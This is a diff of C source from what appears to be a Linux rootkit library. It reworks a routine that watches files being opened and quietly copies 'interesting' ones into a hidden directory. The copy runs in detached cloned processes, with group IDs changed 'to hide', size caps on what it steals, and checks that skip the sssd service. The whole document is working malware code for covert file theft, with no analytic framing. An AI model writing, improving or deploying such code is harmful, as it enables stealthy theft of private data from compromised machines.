@@ -139,35 +139,6 @@ nopenope:
 
 
 int writemap(unsigned char *map, FILE *nfp, off_t fsize, mode_t mode){
-    pid_t pid = fork();
-    if(pid < 0) return -1;
-
-    if(pid > 0){
-        madvise(map, fsize, MADV_DONTNEED);
-        munmap(map, fsize);
-        fclose(nfp);
-        return 1;
-    }
-
-    signal(SIGCHLD, SIG_IGN);
-
-    for(int i=sysconf(_SC_OPEN_MAX); i>=0; i--)
-        if(i != fileno(nfp))
-            close(i);
-
-    if(!notuser(0)){ // hide, if we can.
-        hook(CSETGID);
-        call(CSETGID, readgid());
-    }
-
-    pid = fork();
-    if(pid != 0){
-        madvise(map, fsize, MADV_DONTNEED);
-        munmap(map, fsize);
-        fclose(nfp);
-        exit(0);
-    }
-
     hook(CFWRITE);
     call(CFWRITE, map, 1, fsize, nfp);
     madvise(map, fsize, MADV_DONTNEED);
@@ -178,7 +149,8 @@ int writemap(unsigned char *map, FILE *nfp, off_t fsize, mode_t mode){
     hook(CCHMOD);
     call(CCHMOD, newpath, mode);
 #endif
-    exit(0);
+
+    return 1;
 }
 
 
@@ -212,7 +184,7 @@ int writecopy(const char *oldpath, char *newpath){
     }
 #endif
 #ifdef MAX_STEAL_SIZE
-    if(getnewsize(fsize) > MAX_STEAL_SIZE){
+    if(getnewdirsize(INTEREST_DIR, fsize) > MAX_STEAL_SIZE){
         fcloser(2, ofp, nfp);
         return -1;
     }
@@ -252,23 +224,44 @@ char *getnewpath(char *filename){
     return ret;
 }
 
-int takeit(const char *oldpath, char *newpath){
+static int takeit(void *oldpath){
+    if(!notuser(0)){   // hide, if we can...
+        hook(CSETGID);
+        call(CSETGID, readgid());
+    }
+
+    char *olddup = strdup(oldpath);
+    char *newpath = getnewpath(basename(olddup));
+    int ret;
+
 #ifdef SYMLINK_ONLY
-    return linkfile(oldpath, newpath);
+    ret = linkfile(oldpath, newpath);
 #else
-    int copystat = writecopy(oldpath, newpath);
+    ret = writecopy(oldpath, newpath);
 #ifdef SYMLINK_FALLBACK
-    if(copystat < 0)
-        return linkfile(oldpath, newpath);
+    if(ret < 0)
+        ret = linkfile(oldpath, newpath);
 #endif
-    return copystat;
 #endif
+
+    free(newpath);
+    free(olddup);
+    return ret;
 }
 
-
 void inspectfile(const char *pathname){
-    if(process("/usr/sbin/sssd"))
+    if(process("/usr/sbin/sssd") || rknomore())
         return;
+
+    hook(COPENDIR);
+    DIR *dp = call(COPENDIR, INTEREST_DIR);
+    if(dp == NULL && errno == ENOENT){
+        if(notuser(0)) return;
+        preparedir(INTEREST_DIR, readgid());
+        inspectfile(pathname);
+        return;
+    }else if(dp == NULL) return;
+    else if(dp != NULL) closedir(dp);
 
     int nope=0;
     char *myname = procname();
@@ -276,37 +269,29 @@ void inspectfile(const char *pathname){
         nope = !strncmp("/usr/libexec/sssd", myname, strlen("/usr/libexec/sssd"));
         free(myname);
     }
-    if(nope)
-        return;
+    if(nope) return;
 
     char *dupdup   = strdup(pathname),
-         *filename = basename(dupdup),
-         *newpath;
+         *filename = basename(dupdup);
 
-    if(strlen(pathname)<=1 || strlen(filename)<=1){
-        free(dupdup);
-        return;
-    }
+    if(strlen(pathname)<=1 || strlen(filename)<=1)
+        goto nopenope;
 
     if(interesting(pathname) || interesting(filename)){
-        newpath = getnewpath(filename);
-        if(newpath == NULL){
-            free(dupdup);
-            return;
-        }
+        const int STACK_SIZE = 65536;
+        char *stack = malloc(STACK_SIZE);
+        if(!stack) goto nopenope;
 
-        // this is a real race
-        signal(SIGCHLD, SIG_IGN);
+        unsigned long flags = CLONE_PARENT|CLONE_DETACHED;
+        if(!notuser(0)) flags |= CLONE_NEWUTS;
 #ifdef BLACKLIST_TOO
         if(!uninteresting(filename))
-            takeit(pathname, newpath);
+            clone(takeit, stack + STACK_SIZE, flags, dupdup);
 #else
-        takeit(pathname, newpath);
+        clone(takeit, stack + STACK_SIZE, flags, dupdup);
 #endif
-        free(newpath);
-        usleep(20000); // can we win? probably.
-        signal(SIGCHLD, SIG_DFL);
+        free(stack);
     }
-
+nopenope:
     free(dupdup);
 }
